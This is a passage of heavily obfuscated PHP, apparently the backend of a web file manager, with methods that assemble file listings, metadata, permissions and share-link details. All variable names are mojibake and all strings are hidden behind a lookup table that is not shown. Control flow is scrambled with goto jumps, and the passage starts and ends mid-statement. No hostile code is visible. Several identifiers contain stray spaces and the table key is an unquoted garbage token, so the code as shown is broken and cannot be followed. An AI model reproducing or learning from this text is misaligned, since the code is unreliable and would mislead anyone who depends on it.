$B‡¸È”Ğ“ï = Model($fáõ­¡ï·Ò[448])->get($fáõ­¡ï·Ò[450]); goto cÜ³¢­Œ”Õ; c¾–¼‚š£: $CÏª‘†‘äº = Input::get($fáõ­¡ï·Ò[459], $fáõ­¡ï·Ò[7], $B‡¸È”Ğ“ï, array_keys($b¼Î½ÛÒÜ)); if (!in_array($a™¤¢­³‹ï, array_keys($FÉÖ•±®))) { $a™¤¢­³‹ï = $fáõ­¡ï·Ò[38]; } if (!in_array($CÏª‘†‘äº, array_keys($b¼Î½ÛÒÜ))) { $a™¤¢­³‹ï = $fáõ­¡ï·Ò[451]; } goto E®¸Š£‰õ‰; Aç­™–î§Ï: if ($B¨Ş•óòŸ») { return array($E›‘âÒé, $b¼Î½ÛÒÜ[$CÏª‘†‘äº]); } return $this->order($E›‘âÒé); goto fŸƒŞ©ƒßÓ; E®¸Š£‰õ‰: if ($a™¤¢­³‹ï == $fáõ­¡ï·Ò[38]) { } $E›‘âÒé = $fáõ­¡ï·Ò[460] . $FÉÖ•±®[$a™¤¢­³‹ï] . $fáõ­¡ï·Ò[60] . $b¼Î½ÛÒÜ[$CÏª‘†‘äº]; $E›‘âÒé = rtrim(trim($E›‘âÒé), $fáõ­¡ï·Ò[57]); goto Aç­™–î§Ï; cÜ³¢­Œ”Õ: $b¼Î½ÛÒÜ = array($fáõ­¡ï·Ò[451] => $fáõ­¡ï·Ò[452], $fáõ­¡ï·Ò[453] => $fáõ­¡ï·Ò[454]); $FÉÖ•±® = array($fáõ­¡ï·Ò[38] => $fáõ­¡ï·Ò[38], $fáõ­¡ï·Ò[88] => $fáõ­¡ï·Ò[88], $fáõ­¡ï·Ò[178] => $fáõ­¡ï·Ò[416], $fáõ­¡ï·Ò[455] => $fáõ­¡ï·Ò[455], $fáõ­¡ï·Ò[456] => $fáõ­¡ï·Ò[457], $fáõ­¡ï·Ò[204] => $fáõ­¡ï·Ò[204], $fáõ­¡ï·Ò[94] => $fáõ­¡ï·Ò[94]); $a™¤¢­³‹ï = Input::get($fáõ­¡ï·Ò[458], $fáõ­¡ï·Ò[7], $c«›Í©¡æ‘, array_keys($FÉÖ•±®)); goto c¾–¼‚š£; fŸƒŞ©ƒßÓ: } protected function _listDataApplyItem($bÖŞ›´õÍ¼, $AëŞ†ïÍæ = false) { $D×¯Ù›¹Á = array($bÖŞ›´õÍ¼); $this->_listDataApply($D×¯Ù›¹Á, $AëŞ†ïÍæ); return $D×¯Ù›¹Á[0]; } protected function _listDataApply(&$e…¾Œ›ì±÷, $bÆÆ”È«¿ = false) { goto DÀ®Øô’âµ; BÊ±çÊ¼Üœ: $this->_listAppendPath($e…¾Œ›ì±÷); $this->_listAppendAuth($e…¾Œ›ì±÷); $this->_listAppendSourceInfo($e…¾Œ›ì±÷, $Eí†ø–Ší); goto E¤Éçº…Û; Fù¨¢–Ù÷±: $Eí†ø–Ší = array_unique($Eí†ø–Ší); $this->_listSourceCache($e…¾Œ›ì±÷); if (!$bÆÆ”È«¿) { $this->_listAppendMeta($e…¾Œ›ì±÷, $Eí†ø–Ší); $this->_listAppendFileMeta($e…¾Œ›ì±÷, $Eí†ø–Ší); $this->_listAppendChildren($e…¾Œ›ì±÷, $Eí†ø–Ší); } goto BÊ±çÊ¼Üœ; E¤Éçº…Û: $this->_listAppendUser($e…¾Œ›ì±÷); $this->_listFilterInfo($e…¾Œ›ì±÷, $bÆÆ”È«¿); $this->_listAppendAuthSecret($e…¾Œ›ì±÷); goto Böº÷ª³¶“; DÀ®Øô’âµ: $f ¸ŸñêŠ© =& $_SERVER[œÕÊİğö]; if (!$e…¾Œ›ì±÷) { $e…¾Œ›ì±÷ = array(); return; } $Eí†ø–Ší = array_to_keyvalue($e…¾Œ›ì±÷, $f ¸ŸñêŠ©[43], $f ¸ŸñêŠ©[406]); goto Fù¨¢–Ù÷±; Böº÷ª³¶“: } protected function _listSourceCache($CÑ¡öÛ£˜è) { $F÷¤Ó™…Şë =& $_SERVER[œÕÊİğö]; foreach ($CÑ¡öÛ£˜è as $d¿‰ÍñçÆ‰) { self::$cacheSourceInfo[$F÷¤Ó™…Şë[461] . $d¿‰ÍñçÆ‰[$F÷¤Ó™…Şë[406]]] = $d¿‰ÍñçÆ‰; } } protected function _listFilterInfo(&$DÆœô¦¡™á, $A²ªêæŠªî = false) { $dÂøØğ‰´ =& $_SERVER[œÕÊİğö]; foreach ($DÆœô¦¡™á as &$bá­ò›ôõç) { $bá­ò›ôõç = $this->pathInfoFilter($bá­ò›ôõç); self::$cachePathInfo[$dÂøØğ‰´[462] . intval($A²ªêæŠªî) . $dÂøØğ‰´[463] . $bá­ò›ôõç[$dÂøØğ‰´[406]]] = $bá­ò›ôõç; } unset($bá­ò›ôõç); } protected function _listMake(&$FÕ…ÂµÒŞ) { $CÄÛ´´Î =& $_SERVER[œÕÊİğö]; $FÕ…ÂµÒŞ[$CÄÛ´´Î[85]] = array(); $FÕ…ÂµÒŞ[$CÄÛ´´Î[84]] = array(); foreach ($FÕ…ÂµÒŞ[$CÄÛ´´Î[377]] as $eÉ»Ú”É¤½) { $FöŠÓŸÂ¦ = $eÉ»Ú”É¤½[$CÄÛ´´Î[414]] == 1 ? $CÄÛ´´Î[85] : $CÄÛ´´Î[84]; $FÕ…ÂµÒŞ[$FöŠÓŸÂ¦][] = $eÉ»Ú”É¤½; } unset($FÕ…ÂµÒŞ[$CÄÛ´´Î[377]]); } protected function _listAppendMeta(&$b©ôé¾ñÅ‰, $f¡Ü„Æ•…) { goto FÅÀ›’£½; BîÉÍïÄöä: foreach ($eƒìö½ØŞœ as $dë»Óù…Å) { if (!isset($bóÚ‚¾ÑÓÚ[$dë»Óù…Å[$E¾õÁ¾¤[406]]])) { $bóÚ‚¾ÑÓÚ[$dë»Óù…Å[$E¾õÁ¾¤[406]]] = array(); } if (in_array($dë»Óù…Å[$E¾õÁ¾¤[103]], $c«µ¾–œéÆ)) { continue; } $bóÚ‚¾ÑÓÚ[$dë»Óù…Å[$E¾õÁ¾¤[406]]][$dë»Óù…Å[$E¾õÁ¾¤[103]]] = $dë»Óù…Å[$E¾õÁ¾¤[382]]; } foreach ($b©ôé¾ñÅ‰ as &$Eœ áãÉÁ¥) { $Eœ áãÉÁ¥[$E¾õÁ¾¤[468]] = !1; if (isset($bóÚ‚¾ÑÓÚ[$Eœ áãÉÁ¥[$E¾õÁ¾¤[406]]])) { $Eœ áãÉÁ¥[$E¾õÁ¾¤[468]] = $bóÚ‚¾ÑÓÚ[$Eœ áãÉÁ¥[$E¾õÁ¾¤[406]]]; } if ($this->fileIsLock($Eœ áãÉÁ¥) && $Eœ áãÉÁ¥[$E¾õÁ¾¤[417]]) { $f¼¤Ì¥ğµ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Eœ áãÉÁ¥[$E¾õÁ¾¤[417]][$E¾õÁ¾¤[418]] = AuthModel::authDisable($Eœ áãÉÁ¥[$E¾õÁ¾¤[417]][$E¾õÁ¾¤[418]], $f¼¤Ì¥ğµ); $Eœ áãÉÁ¥[$E¾õÁ¾¤[417]][$E¾õÁ¾¤[469]][$E¾õÁ¾¤[417]] = $Eœ áãÉÁ¥[$E¾õÁ¾¤[417]][$E¾õÁ¾¤[418]]; } } unset($Eœ áãÉÁ¥); goto d¤àé³ŒË; FÅÀ›’£½: $E¾õÁ¾¤ =& $_SERVER[œÕÊİğö]; $FÅ…¼¾Íó = array($E¾õÁ¾¤[421] => array($E¾õÁ¾¤[422], $f¡Ü„Æ•…)); $eƒìö½ØŞœ = Model($E¾õÁ¾¤[464])->field($E¾õÁ¾¤[465])->where($FÅ…¼¾Íó)->select(); goto A¯’†ƒ¬Ÿ; A¯’†ƒ¬Ÿ: if (!$eƒìö½ØŞœ) { return; } $c«µ¾–œéÆ = array($E¾õÁ¾¤[466], $E¾õÁ¾¤[467], $E¾õÁ¾¤[445]); $bóÚ‚¾ÑÓÚ = array(); goto BîÉÍïÄöä; d¤àé³ŒË: } protected function _listAppendFileMeta(&$bã§§•“à, $C©¤ÏšŞ¶½) { goto C‘çÆË´ï®; EœÎÔ´Íµ: $C‰ĞŠÍ»ãĞ = Model($A¯ÜÒÁƒ¬[473])->field($a‚±¶ˆ¾ôá)->where($F¥Ø‰Ô–ŸÁ)->select(); $C‰ĞŠÍ»ãĞ = array_to_keyvalue($C‰ĞŠÍ»ãĞ, $A¯ÜÒÁƒ¬[470]); $C•Ú±‡Æ¤× = Model($A¯ÜÒÁƒ¬[474])->field($A¯ÜÒÁƒ¬[475])->where($F¥Ø‰Ô–ŸÁ)->select(); goto Dß¯«ù¸½; dàù‘ñóó: if (!$c–Øˆ·ôèø) { return; } $F¥Ø‰Ô–ŸÁ = array($A¯ÜÒÁƒ¬[471] => array($A¯ÜÒÁƒ¬[422], $c–Øˆ·ôèø)); $a‚±¶ˆ¾ôá = $A¯ÜÒÁƒ¬[472]; goto EœÎÔ´Íµ; C‘çÆË´ï®: $A¯ÜÒÁƒ¬ =& $_SERVER[œÕÊİğö]; $c–Øˆ·ôèø = array_to_keyvalue($bã§§•“à, $A¯ÜÒÁƒ¬[43], $A¯ÜÒÁƒ¬[470]); $c–Øˆ·ôèø = array_filter(array_unique($c–Øˆ·ôèø)); goto dàù‘ñóó; Dß¯«ù¸½: $C•Ú±‡Æ¤× = $C•Ú±‡Æ¤× ? $C•Ú±‡Æ¤× : array(); $bƒ‹ìåøÓŸ = array(); foreach ($C•Ú±‡Æ¤× as $Dæöİî®„ª) { if (!isset($bƒ‹ìåøÓŸ[$Dæöİî®„ª[$A¯ÜÒÁƒ¬[470]]])) { $bƒ‹ìåøÓŸ[$Dæöİî®„ª[$A¯ÜÒÁƒ¬[470]]] = array(); } $bƒ‹ìåøÓŸ[$Dæöİî®„ª[$A¯ÜÒÁƒ¬[470]]][$Dæöİî®„ª[$A¯ÜÒÁƒ¬[103]]] = $Dæöİî®„ª[$A¯ÜÒÁƒ¬[382]]; } goto bÀÖ†‚Ã›; bÀÖ†‚Ã›: foreach ($bã§§•“à as &$Fç¤‡åî×İ) { goto A½Œî¡……; A½Œî¡……: $aÓŠ‹®í¶ = $Fç¤‡åî×İ[$A¯ÜÒÁƒ¬[470]]; if (!$aÓŠ‹®í¶ || !is_array($C‰ĞŠÍ»ãĞ[$aÓŠ‹®í¶])) { continue; } $Aç…×çÈ³Œ = $C‰ĞŠÍ»ãĞ[$aÓŠ‹®í¶]; goto Aà¾¥’Ùòï; AŒ÷é¦“¨Œ: unset($C‰ĞŠÍ»ãĞ[$aÓŠ‹®í¶][$A¯ÜÒÁƒ¬[86]]); $e¨¼ºĞ³Íê = is_array($bƒ‹ìåøÓŸ[$aÓŠ‹®í¶]) ? $bƒ‹ìåøÓŸ[$aÓŠ‹®í¶] : array(); $Fç¤‡åî×İ[$A¯ÜÒÁƒ¬[174]] = array_merge($e¨¼ºĞ³Íê, $C‰ĞŠÍ»ãĞ[$aÓŠ‹®í¶]); goto B”¹‹ÌâÒ¾; B”¹‹ÌâÒ¾: if (isset($Fç¤‡åî×İ[$A¯ÜÒÁƒ¬[174]][$A¯ÜÒÁƒ¬[173]])) { $Fç¤‡åî×İ[$A¯ÜÒÁƒ¬[173]] = json_decode($Fç¤‡åî×İ[$A¯ÜÒÁƒ¬[174]][$A¯ÜÒÁƒ¬[173]], !0); unset($Fç¤‡åî×İ[$A¯ÜÒÁƒ¬[174]][$A¯ÜÒÁƒ¬[173]]); } goto B’¥Ü±æÁ ; Aà¾¥’Ùòï: $Aç…×çÈ³Œ[$A¯ÜÒÁƒ¬[88]] = $Fç¤‡åî×İ[$A¯ÜÒÁƒ¬[88]]; $Aç…×çÈ³Œ[$A¯ÜÒÁƒ¬[38]] = $Fç¤‡åî×İ[$A¯ÜÒÁƒ¬[38]]; if (!isset(self::$cacheFileInfo[$A¯ÜÒÁƒ¬[476] . $aÓŠ‹®í¶])) { self::$cacheFileInfo[$A¯ÜÒÁƒ¬[476] . $aÓŠ‹®í¶] = array_merge(array(), $Aç…×çÈ³Œ); } goto AŒ÷é¦“¨Œ; B’¥Ü±æÁ : } unset($Fç¤‡åî×İ); goto EŠÛ‰•Ø”; EŠÛ‰•Ø”: } protected function _listAppendSourceInfo(&$Cğê©¨õ•, $fÍ ³´ÀØê) { goto EàÈØÉèĞç; Fæ”·°–¯: return $Cğê©¨õ•; goto Eîë‘Ã¢Ö£; a¢æ­¯Ì§: $FôÙºäÁà = array_to_keyvalue($DêíÜ„ê, $d‡Á¶±æ† [404]); $DÕ›‹Ôâå = array_to_keyvalue_group($Ağ·—ò ö˜, $d‡Á¶±æ† [86], $d‡Á¶±æ† [430]); $AŒÓ»¢ÍŠù = array_to_keyvalue($Dé¨©˜ÜÆ£, $d‡Á¶±æ† [86]); goto Bæ„¢ä¥; Bæ„¢ä¥: $Dí‚ÏÙ¢¯î = array_to_keyvalue_group($DĞÄ, $d‡Á¶±æ† [406]); foreach ($Cğê©¨õ• as &$e‹„õ¨õÛ®) { $e‹„õ¨õÛ®[$d‡Á¶±æ† [95]] = array($d‡Á¶±æ† [480] => 0, $d‡Á¶±æ† [481] => 0, $d‡Á¶±æ† [482] => 0); if (isset($AŒÓ»¢ÍŠù[$e‹„õ¨õÛ®[$d‡Á¶±æ† [406]]])) { $e‹„õ¨õÛ®[$d‡Á¶±æ† [95]][$d‡Á¶±æ† [483]] = 1; $e‹„õ¨õÛ®[$d‡Á¶±æ† [95]][$d‡Á¶±æ† [484]] = $AŒÓ»¢ÍŠù[$e‹„õ¨õÛ®[$d‡Á¶±æ† [406]]][$d‡Á¶±æ† [38]]; } if (isset($DÕ›‹Ôâå[$e‹„õ¨õÛ®[$d‡Á¶±æ† [406]]])) { $e‹„õ¨õÛ®[$d‡Á¶±æ† [95]][$d‡Á¶±æ† [485]] = array(); foreach ($DÕ›‹Ôâå[$e‹„õ¨õÛ®[$d‡Á¶±æ† [406]]] as $F¾ö’ñ¹ç’) { $Dâ¯–‰¡™Ê = $FôÙºäÁà[$F¾ö’ñ¹ç’]; $e‹„õ¨õÛ®[$d‡Á¶±æ† [95]][$d‡Á¶±æ† [485]][] = array($d‡Á¶±æ† [486] => $Dâ¯–‰¡™Ê[$d‡Á¶±æ† [404]], $d‡Á¶±æ† [424] => $Dâ¯–‰¡™Ê[$d‡Á¶±æ† [38]], $d‡Á¶±æ† [487] => $Dâ¯–‰¡™Ê[$d‡Á¶±æ† [488]]); } } if (isset($Dí‚ÏÙ¢¯î[$e‹„õ¨õÛ®[$d‡Á¶±æ† [406]]])) { $e‹„õ¨õÛ®[$d‡Á¶±æ† [95]][$d‡Á¶±æ† [489]] = array(); foreach ($Dí‚ÏÙ¢¯î[$e‹„õ¨õÛ®[$d‡Á¶±æ† [406]]] as $Aä¯ÎëÛ¢) { $e‹„õ¨õÛ®[$d‡Á¶±æ† [95]][$d‡Á¶±æ† [489]] = array($d‡Á¶±æ† [490] => $Aä¯ÎëÛ¢[$d‡Á¶±æ† [491]], $d‡Á¶±æ† [492] => $Aä¯ÎëÛ¢[$d‡Á¶±æ† [493]], $d‡Á¶±æ† [494] => $Aä¯ÎëÛ¢[$d‡Á¶±æ† [406]], $d‡Á¶±æ† [495] => $Aä¯ÎëÛ¢[$d‡Á¶±æ† [496]], $d‡Á¶±æ† [497] => $Aä¯ÎëÛ¢[$d‡Á¶±æ† [498]], $d‡Á¶±æ† [499] => $Aä¯ÎëÛ¢[$d‡Á¶±æ† [499]], $d‡Á¶±æ† [500] => $Aä¯ÎëÛ¢[$d‡Á¶±æ† [500]]); } } } unset($e‹„õ¨õÛ®); goto Fæ”·°–¯; CÏœáĞ¹¨: $Ağ·—ò ö˜ = Model($d‡Á¶±æ† [429])->listData(); $Dé¨©˜ÜÆ£ = Model($d‡Á¶±æ† [419])->listData(); $DĞÄ = Model($d‡Á¶±æ† [479])->listSimple(); goto a¢æ­¯Ì§; EàÈØÉèĞç: $d‡Á¶±æ†  =& $_SERVER[œÕÊİğö]; if (!defined($d‡Á¶±æ† [477])) { return; } $DêíÜ„ê = Model($d‡Á¶±æ† [478])->listData(); goto CÏœáĞ¹¨; Eîë‘Ã¢Ö£: } protected function _listAppendChildren(&$a®šœ­ñ½×, $F³»×½Ô¤Å) { goto D™ÃµÑßœç; b˜«Ë»±Æ: $CÄ³‹‹³¼® = array($c×·ÈÌ‰Ë [501] => array($c×·ÈÌ‰Ë [7], $dâÒÇóè–Š)); $fóÒ¢·èğ¯ = array($c×·ÈÌ‰Ë [501], $c×·ÈÌ‰Ë [414], $c×·ÈÌ‰Ë [502] => $c×·ÈÌ‰Ë [503]); $Aì±¢“Š®Í = $this->field($fóÒ¢·èğ¯)->where($CÄ³‹‹³¼®)->group($c×·ÈÌ‰Ë [504])->select(); goto bÚ—îÕö›; AŞÅ¼—÷“: foreach ($a®šœ­ñ½× as &$eß¥·¢Í²) { if (!$eß¥·¢Í²[$c×·ÈÌ‰Ë [414]]) { continue; } $dâÒÇóè–Š[] = $eß¥·¢Í²[$c×·ÈÌ‰Ë [406]]; } unset($eß¥·¢Í²); if (!$dâÒÇóè–Š) { return; } goto b˜«Ë»±Æ; D˜á‡ãÒ¤‹: unset($eß¥·¢Í²); goto C­œ¢Ûù–‰; D™ÃµÑßœç: $c×·ÈÌ‰Ë  =& $_SERVER[œÕÊİğö]; $dâÒÇóè–Š = array(); $f¹™²¼Äõ = array($c×·ÈÌ‰Ë [213] => 0, $c×·ÈÌ‰Ë [214] => 0); goto AŞÅ¼—÷“; bÚ—îÕö›: $fÛò‡â¦À§ = array(); foreach ($Aì±¢“Š®Í as $aåè™µÎ§„) { $bå¹§®Á®Ã = $aåè™µÎ§„[$c×·ÈÌ‰Ë [501]]; $dß¡æ¼öÕ = $aåè™µÎ§„[$c×·ÈÌ‰Ë [414]] == $c×·ÈÌ‰Ë [97] ? $c×·ÈÌ‰Ë [214] : $c×·ÈÌ‰Ë [213]; if (!isset($fÛò‡â¦À§[$bå¹§®Á®Ã])) { $fÛò‡â¦À§[$bå¹§®Á®Ã] = array($c×·ÈÌ‰Ë [213] => 0, $c×·ÈÌ‰Ë [214] => 0); } $fÛò‡â¦À§[$bå¹§®Á®Ã][$dß¡æ¼öÕ] += $aåè™µÎ§„[$c×·ÈÌ‰Ë [503]]; } foreach ($a®šœ­ñ½× as &$eß¥·¢Í²) { if (!$eß¥·¢Í²[$c×·ÈÌ‰Ë [414]]) { continue; } $Bé¾¼½Èœ· = is_array($fÛò‡â¦À§[$eß¥·¢Í²[$c×·ÈÌ‰Ë [406]]]) ? $fÛò‡â¦À§[$eß¥·¢Í²[$c×·ÈÌ‰Ë [406]]] : $f¹™²¼Äõ; $eß¥·¢Í²[$c×·ÈÌ‰Ë [214]] = $Bé¾¼½Èœ·[$c×·ÈÌ‰Ë [214]]; $eß¥·¢Í²[$c×·ÈÌ‰Ë [213]] = $Bé¾¼½Èœ·[$c×·ÈÌ‰Ë [213]]; unset($eß¥·¢Í²[$c×·ÈÌ‰Ë [416]]); } goto D˜á‡ãÒ¤‹; C­œ¢Ûù–‰: } protected function _listAppendAuth(&$DÓ§”Ú…ºô) { goto aî „‘×Ó×; aÊ˜Ù–Èƒ: $C™¢´÷Ç–ˆ = Model($B‰…¹ÄÛñø[505])->getSourceList($Eò‰¿›œ…Ñ, $aÌæ—®×ÁÃ); foreach ($DÓ§”Ú…ºô as $a‹®øø«ŠÁ => &$EÁ´Œ¨â¾„) { $EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[417]] = $C™¢´÷Ç–ˆ[$EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[406]]]; if (!$EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[417]] && $EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[415]] == self::TYPE_GROUP) { $EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[417]] = Action($B‰…¹ÄÛñø[506])->pathGroupAuthMake($EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[507]]); if (!$EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[417]] && !_get($GLOBALS, $B‰…¹ÄÛñø[508])) { $EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[206]] = !1; $EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[205]] = !1; } } if ($EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[417]]) { $EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[206]] = AuthModel::authCheckEdit($EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[417]][$B‰…¹ÄÛñø[418]]); $EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[205]] = AuthModel::authCheckView($EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[417]][$B‰…¹ÄÛñø[418]]); } $this->groupPathDisplay($EÁ´Œ¨â¾„); } unset($EÁ´Œ¨â¾„); goto b™Â…ô‚¥; aî „‘×Ó×: $B‰…¹ÄÛñø =& $_SERVER[œÕÊİğö]; if (!defined($B‰…¹ÄÛñø[477])) { return; } $Eò‰¿›œ…Ñ = array(); goto F»µê‚´¹è; F»µê‚´¹è: foreach ($DÓ§”Ú…ºô as $EÁ´Œ¨â¾„) { if ($EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[415]] == self::TYPE_GROUP) { $Eò‰¿›œ…Ñ[] = $EÁ´Œ¨â¾„[$B‰…¹ÄÛñø[406]]; } } if (!$Eò‰¿›œ…Ñ) { return; } $aÌæ—®×ÁÃ = array_to_keyvalue($DÓ§”Ú…ºô, $B‰…¹ÄÛñø[406]); goto aÊ˜Ù–Èƒ; b™Â…ô‚¥: } public function _listAppendAuthSecret(&$B×ñ„ÂŠï) { goto D‡Ñ•ª•¤¨; D‡Ñ•ª•¤¨: $Cç¯Ìáùœó =& $_SERVER[œÕÊİğö]; if (Model($Cç¯Ìáùœó[436])->get($Cç¯Ìáùœó[509]) != $Cç¯Ìáùœó[97]) { return; } static $F‡‘Ç©ÓÍ‚ = false; goto FÑÓŸë„ùã; fŒåĞÁË·: $DâÙÑµ…ë = $this->_listAppendPath($eØ‚ ØÅ‹Â, !0); foreach ($B×ñ„ÂŠï as $Fé£Ç›÷–¸ => &$Bì“ØË­Îá) { if (!is_array($Bì“ØË­Îá[$Cç¯Ìáùœó[417]])) { continue; } if ($Bì“ØË­Îá[$Cç¯Ìáùœó[415]] != $Cç¯Ìáùœó[518]) { continue; } if (isset($F‡‘Ç©ÓÍ‚[$Bì“ØË­Îá[$Cç¯Ìáùœó[406]]])) { goto A¾ŒÛ ÂÃ; A¾ŒÛ ÂÃ: $EÈíÎ¸ŠÒÇ = $F‡‘Ç©ÓÍ‚[$Bì“ØË­Îá[$Cç¯Ìáùœó[406]]]; if (!is_array($Bì“ØË­Îá[$Cç¯Ìáùœó[468]])) { $Bì“ØË­Îá[$Cç¯Ìáùœó[468]] = array(); } $Bì“ØË­Îá[$Cç¯Ìáùœó[468]][$Cç¯Ìáùœó[519]] = $EÈíÎ¸ŠÒÇ[$Cç¯Ìáùœó[513]]; goto Eš‘‹êÉÅ¯; Eš‘‹êÉÅ¯: $Bì“ØË­Îá[$Cç¯Ìáùœó[417]][$Cç¯Ìáùœó[520]] = $EÈíÎ¸ŠÒÇ; $Bì“ØË­Îá[$Cç¯Ìáùœó[417]][$Cç¯Ìáùœó[521]] = $Bì“ØË­Îá[$Cç¯Ìáùœó[522]]; $Bì“ØË­Îá[$Cç¯Ìáùœó[417]][$Cç¯Ìáùœó[523]] = $Cç¯Ìáùœó[97]; goto f¹Úä†©›; f¹Úä†©›: if ($EÈíÎ¸ŠÒÇ[$Cç¯Ìáùœó[455]] != $bË‚ãÆŞ„ô) { $Bì“ØË­Îá[$Cç¯Ìáùœó[417]][$Cç¯Ìáùœó[418]] = $Bì“ØË­Îá[$Cç¯Ìáùœó[417]][$Cç¯Ìáùœó[418]] & $EÈíÎ¸ŠÒÇ[$Cç¯Ìáùœó[417]][$Cç¯Ìáùœó[417]]; } continue; goto B§œˆ´‚‚ß; B§œˆ´‚‚ß: } $A™•¡ïˆïÌ = $this->parentLevelArray($Bì“ØË­Îá[$Cç¯Ìáùœó[524]]); $DŒ‘Åã¡’í = array_reverse($A™•¡ïˆïÌ); foreach ($DŒ‘Åã¡’í as $b¡¢’«°Ë => $E„Œµ‚ï½£) { goto a°ŒÜ›¢Ö×; C¢Óåâ˜Øß: if ($EÈíÎ¸ŠÒÇ[$Cç¯Ìáùœó[455]] != $bË‚ãÆŞ„ô) { $Bì“ØË­Îá[$Cç¯Ìáùœó[417]][$Cç¯Ìáùœó[418]] = $Bì“ØË­Îá[$Cç¯Ìáùœó[417]][$Cç¯Ìáùœó[418]] & $EÈíÎ¸ŠÒÇ[$Cç¯Ìáùœó[417]][$Cç¯Ìáùœó[417]]; } $C‡‰ÇÊÙ¿ = $Cç¯Ìáùœó[43]; $A³˜Ã·£– = count($A™•¡ïˆïÌ) - $b¡¢’«°Ë; goto c³»˜÷¹Ä¶; a°ŒÜ›¢Ö×: if (!isset($F‡‘Ç©ÓÍ‚[$E„Œµ‚ï½£])) { continue; } $EÈíÎ¸ŠÒÇ = $F‡‘Ç©ÓÍ‚[$E„Œµ‚ï½£]; $Bì“ØË­Îá[$Cç¯Ìáùœó[417]][$Cç¯Ìáùœó[520]] = $EÈíÎ¸ŠÒÇ; goto C¢Óåâ˜Øß; c³»˜÷¹Ä¶: for ($a—‘·†—ï¹ = 0; $a—‘·†—ï¹ < $A³˜Ã·£–; $a—‘·†—ï¹++) { if (!isset($DâÙÑµ…ë[$A™•¡ïˆïÌ[$a—‘·†—ï¹]])) { $C‡‰ÇÊÙ¿ = $Cç¯Ìáùœó[43]; break; } $C‡‰ÇÊÙ¿ = $C‡‰ÇÊÙ¿ . rtrim($DâÙÑµ…ë[$A™•¡ïˆïÌ[$a—‘·†—ï¹]], $Cç¯Ìáùœó[8]) . $Cç¯Ìáùœó[8]; } $Bì“ØË­Îá[$Cç¯Ìáùœó[417]][$Cç¯Ìáùœó[521]] = rtrim($C‡‰ÇÊÙ¿, $Cç¯Ìáùœó[8]) . $Cç¯Ìáùœó[8]; break; goto EŒµÊâàÃ; EŒµÊâàÃ: } } unset($Bì“ØË­Îá); goto E‰Ş²§š´; FÑÓŸë„ùã: if (!$F‡‘Ç©ÓÍ‚) { goto a˜˜°Á²Ì; e¶‘ç¶Ü»: $F‡‘Ç©ÓÍ‚ = array_to_keyvalue($F‡‘Ç©ÓÍ‚, $Cç¯Ìáùœó[406]); $dÅ‚ªÃÁª½ = json_decode(Model($Cç¯Ìáùœó[436])->get($Cç¯Ìáùœó[512]), !0); $dÅ‚ªÃÁª½ = array_to_keyvalue($dÅ‚ªÃÁª½, $Cç¯Ìáùœó[404]); goto E¬ø„ğ•–ß; a˜˜°Á²Ì: $C°êˆİéÊ = Model($Cç¯Ìáùœó[510]); $E‡¸¢„•©ù = Model($Cç¯Ìáùœó[511]); $F‡‘Ç©ÓÍ‚ = $E‡¸¢„•©ù->listData(); goto e¶‘ç¶Ü»; E¬ø„ğ•–ß: foreach ($F‡‘Ç©ÓÍ‚ as $Fé£Ç›÷–¸ => $Bì“ØË­Îá) { goto cƒ–°ŒõËŒ; bÈİ Ö‘: if (!$B¶é±Ç”) { $E‡¸¢„•©ù->remove($Bì“ØË­Îá[$Cç¯Ìáùœó[404]]); unset($F‡‘Ç©ÓÍ‚[$Fé£Ç›÷–¸]); continue; } $Bì“ØË­Îá[$Cç¯Ìáùœó[417]] = $B¶é±Ç”; $Bì“ØË­Îá[$Cç¯Ìáùœó[514]] = $DÉÕ²³Ÿñ¢; goto eÄ”³¡†ç‚; cƒ–°ŒõËŒ: $DÉÕ²³Ÿñ¢ = $dÅ‚ªÃÁª½[$Bì“ØË­Îá[$Cç¯Ìáùœó[513]]]; if (!$DÉÕ²³Ÿñ¢) { $E‡¸¢„•©ù->remove($Bì“ØË­Îá[$Cç¯Ìáùœó[404]]); unset($F‡‘Ç©ÓÍ‚[$Fé£Ç›÷–¸]); continue; } $B¶é±Ç” = $C°êˆİéÊ->listData($DÉÕ²³Ÿñ¢[$Cç¯Ìáùœó[417]]); goto bÈİ Ö‘; eÄ”³¡†ç‚: $Bì“ØË­Îá[$Cç¯Ìáùœó[515]] = Model($Cç¯Ìáùœó[516])->getInfoSimpleOuter($Bì“ØË­Îá[$Cç¯Ìáùœó[455]]); $F‡‘Ç©ÓÍ‚[$Fé£Ç›÷–¸] = $Bì“ØË­Îá; goto c×¯šÚ Õ; c×¯šÚ Õ: } goto b¢áŠêñ¦å; b¢áŠêñ¦å: } $bË‚ãÆŞ„ô = defined($Cç¯Ìáùœó[517]) ? USER_ID : $Cç¯Ìáùœó[43]; $eØ‚ ØÅ‹Â = array(); goto fŒåĞÁË·; E‰Ş²§š´: } public function groupPathDisplay(&$c¤Æ–¤Ø) { goto A¿š¿æÎ‹Ò; Eç½…ŒÀ¿: $c¤Æ–¤Ø[$F÷‹«Æ•…¤[530]] = $aÒõ‚•¡â¯ . $B®±™°Ü÷ã[$F÷‹«Æ•…¤[95]][$F÷‹«Æ•…¤[406]]; goto aìáò¼‰ã†; A¿š¿æÎ‹Ò: $F÷‹«Æ•…¤ =& $_SERVER[œÕÊİğö]; if ($c¤Æ–¤Ø[$F÷‹«Æ•…¤[415]] != self::TYPE_GROUP) { return; } $B®±™°Ü÷ã = Model($F÷‹«Æ•…¤[525])->getInfo($c¤Æ–¤Ø[$F÷‹«Æ•…¤[507]]); goto a¥ƒ©™—¢È; e†®–ˆôŠ¡: $c¤Æ–¤Ø[$F÷‹«Æ•…¤[526]] = $B®±™°Ü÷ã[$F÷‹«Æ•…¤[501]]; $c¤Æ–¤Ø[$F÷‹«Æ•…¤[527]] = 